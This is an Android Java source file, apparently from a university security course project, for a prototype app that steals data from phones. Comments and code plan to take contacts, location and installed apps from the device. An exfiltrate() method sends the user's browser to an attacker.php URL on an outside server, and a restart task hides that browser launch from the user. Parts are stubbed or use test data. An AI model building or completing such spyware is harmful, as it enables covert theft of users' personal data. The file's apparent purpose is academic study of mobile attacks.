package com.trustme.testsu;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Message;
import android.os.SystemClock;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity {
	public static final String TAG = "Main Activity";
	public static final int START_IP_CHECK = 1;
	public static final int STOP_IP_CHECK = 2;
	public Context ctx;
	private SQLiteDatabase database;
	
	private ContactsDataSource datasource;
	protected Button btn_exfiltrate, btn_check_ip, btn_stop_check_ip;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
         ctx = this;
         
         datasource = new ContactsDataSource(this);
         database = datasource.open();
         //we should start checking for Internet connection only when there are new data available
         getUserLocation();
         getInstalledApplications();
         getContacts();
         prepareButtonCheckIp();
         prepareButtonStopCheckIp();
         prepareButtonExfiltrate();
    	
    }
    
    @Override
    public void onDestroy(){
    	datasource.close();
    	super.onDestroy();
    }

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
    /**
     * @author sdemetr2
     * This function should fetch and try to exfiltrate 
     * 	all installed applications.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     */
    private void getInstalledApplications() {
		// TODO Auto-generated method stub
		//send installed packages with their PID to malserver
    	//server responds with competitors pid
    	//app kills that pid whenever it runs
    	GetPackagesTask get_packages_task = new GetPackagesTask();
    	get_packages_task.execute();
	}

	
	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////	
    
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /**
     * @author sdemetr2
     * This function should fetch and and try to exfiltrate 
     * 	all user's contacts.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     */
	private void getContacts() {
	
		GetContactsTask get_contacts_task = new GetContactsTask();
		get_contacts_task.execute();
	}



//////////////////////////////////////////////////////////////////////////////////////////////////////////////    

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/**
	 * @author sdemetr2
     * This function should fetch and and try to exfiltrate 
     * 	the device's location.
     * If there is no wifi store the data in the Database and
     * 	exfiltrate as soon as the wifi is back on.
     * Ideally it should perform this action in the background.
     */
	private void getUserLocation() {
		// TODO Auto-generated method stub
		
	}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	
	private void prepareButtonCheckIp() {
		// TODO Auto-generated method stub
    	btn_check_ip = (Button) findViewById(R.id.start_ip_checking);
    	
    	btn_check_ip.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				start_checking_for_ip();
			}

		});
	}
    
    private void prepareButtonStopCheckIp() {
		// TODO Auto-generated method stub
    	btn_stop_check_ip = (Button) findViewById(R.id.stop_ip_checking);
    	
    	btn_stop_check_ip.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				stop_checking_for_ip();
			}

		});
	}
    
    /**
     * @author sdemetr2
     * This function starts a service that checks periodically 
     *  if the device has an IP address and thus Internet access
     */
    private void start_checking_for_ip() {
		// TODO Auto-generated method stub
		Log.i(TAG, "start service");
		Intent intent = new Intent(getApplicationContext(), BackgroundService.class);
		intent.putExtra("CMD", START_IP_CHECK);
		startService(intent);
	}
    
    /**
     * @author sdemetr2
     * A call to this function should stop the service that checks periodically 
     *  if the device has an IP address and thus Internet access
     */
	protected void stop_checking_for_ip() {
		// TODO Auto-generated method stub
		Log.i(TAG, "stop service");
		Intent intent = new Intent(getApplicationContext(), 
				BackgroundService.class);
		intent.putExtra("CMD", STOP_IP_CHECK);
		stopService(intent);
	}

	private void prepareButtonExfiltrate() {
		// TODO Auto-generated method stub
    	btn_exfiltrate = (Button) findViewById(R.id.exfiltrate);
    	
    	btn_exfiltrate.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				exfiltrate();
			}

		});
	}
	
	
	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/**
	 * @author sdemetr2
     * This function will attempt to send the data to the url
     * 	using the browser
     */
    private void exfiltrate() {
		// TODO Auto-generated method stub
    	this.runOnUiThread(new Runnable(){
            public void run(){
                try {
                    RestartTask restartTask = new RestartTask();
                    restartTask.execute();
                }
                catch (Exception e) {
                    Log.d("MyPlugin", "Exploded when trying to start background task: " + e.getMessage());
                }
            }
        });
        
        Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://soterisdemetriou.com/cs423/project/attacker.php?id=198462034867"));
    	startActivity(myIntent);
	}
    
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
	@Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	/**
	 * @author sdemetr2
     * A background task that starts an Activity which will Restart the main Activity
     * Useful for hiding an operation that was triggered by the main activity  
     */
    public class RestartTask extends AsyncTask<Void, Void, Void>{
    	protected RestartTask() { }

        @Override
        protected Void doInBackground(Void... unused){
            try {
                // pass time so the built-in dialer app can make the call
                Thread.sleep(50);
            }
            catch (InterruptedException localInterruptedException)
            {
                Log.d("MyPlugin", "RestartTask received an InterruptedException");
            }

            return null;
        }

        @Override
        protected void onPostExecute(Void justEyeCandy){
            super.onPostExecute(justEyeCandy);

            // Start the RestartActivity in a new task. This will snap the phone out of the built-in dialer app, which
            // has started in it's own task at this point in time. The RestartActivity gains control and finishes
            // immediately, leading control back to the activity at the top of the stack in the
            // app (where the user came from when making the call).
            Intent restartIntent = new Intent(MainActivity.this.ctx.getApplicationContext(), RestartActivity.class);
            restartIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            MainActivity.this.ctx.getApplicationContext().startActivity(restartIntent);
        }
    }
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/**
	 * 
	 * @author sdemetr2
	 * 
	 * Background Task for fetching user's contacts.
	 * It should try to exfiltrate them if there is Internet available or store them
	 *	in the Db and start the IP checker
	 */
	public class GetContactsTask extends AsyncTask<Void, Void, Void>{
		protected GetContactsTask() { }
		
		@Override
		protected Void doInBackground(Void... unused){
			try {
				// pass time so the built-in dialer app can make the call
				Thread.sleep(50);
			}
			catch (InterruptedException localInterruptedException)
			{
				Log.d("GetPackagesTask", "GetPackagesTask received an InterruptedException");
			}
			
			return null;
		}
		
		@Override
		protected void onPostExecute(Void justEyeCandy){
			super.onPostExecute(justEyeCandy);
			getAndSaveContacts();
			//getPackages();
		}
	
		private void getAndSaveContacts() {
			// TODO Auto-generated method stub
	
			 database.execSQL("insert into " + DatabaseOpenHelper.DATABASE_TABLE_NAME + " (name,surname,phone)" + "values(\"soteris\",\"demetriou\","
			                 + "\"102853471\") ;");
			 Cursor c = database.rawQuery("Select * from " + DatabaseOpenHelper.DATABASE_TABLE_NAME, null);
			 c.moveToNext();
			 Log.i(TAG,c.getString(c.getColumnIndex(DatabaseOpenHelper.COLUMN_NAME)));
	
		}
	}  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/**
	 * 
	 * @author sdemetr2
	 * 
	 * Background Task that will fetch the installed packages on the device.
	 * It will try to exfiltrate them if there is Internet or 
	 * store them in the DB and start the IP checker
	 *
	 */
	public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
		protected GetPackagesTask() { }
		
		@Override
		protected Void doInBackground(Void... unused){
			try {
				// pass time so the built-in dialer app can make the call
				Thread.sleep(50);
			}
			catch (InterruptedException localInterruptedException)
			{
				Log.d("GetPackagesTask", "GetPackagesTask received an InterruptedException");
			}
			
			return null;
		}
		
		@Override
		protected void onPostExecute(Void justEyeCandy){
			super.onPostExecute(justEyeCandy);
			
			getPackages();
		}
		
		/**
		 * It just prints the fetched packages info
		 * @return an ArrayList with the installed Applications as PInfo objects
		 */
		private ArrayList<PInfo> getPackages() {
		    ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
		    final int max = apps.size();
		    for (int i=0; i<max; i++) {
		        apps.get(i).prettyPrint();
		    }
		    return apps;
		}
		
		/**
		 * 
		 * @param getSysPackages true if you want to fetch System packages as well, false otherwise
		 * @return an ArrayList with the installed Applications as PInfo objects
		 */
		private ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
		    ArrayList<PInfo> res = new ArrayList<PInfo>();        
		    List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);
		    for(int i=0; i<packs.size(); i++) {
		        PackageInfo p = packs.get(i);
		        if ((!getSysPackages) && (p.versionName == null)) {
		            continue ;
		        }
		        PInfo newInfo = new PInfo();
		        newInfo.appname = p.applicationInfo.loadLabel(getPackageManager()).toString();
		        newInfo.pname = p.packageName;
		        newInfo.versionName = p.versionName;
		        newInfo.versionCode = p.versionCode;
		        newInfo.icon = p.applicationInfo.loadIcon(getPackageManager());
		        res.add(newInfo);
		    }
		    return res; 
		}
		
	}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
}
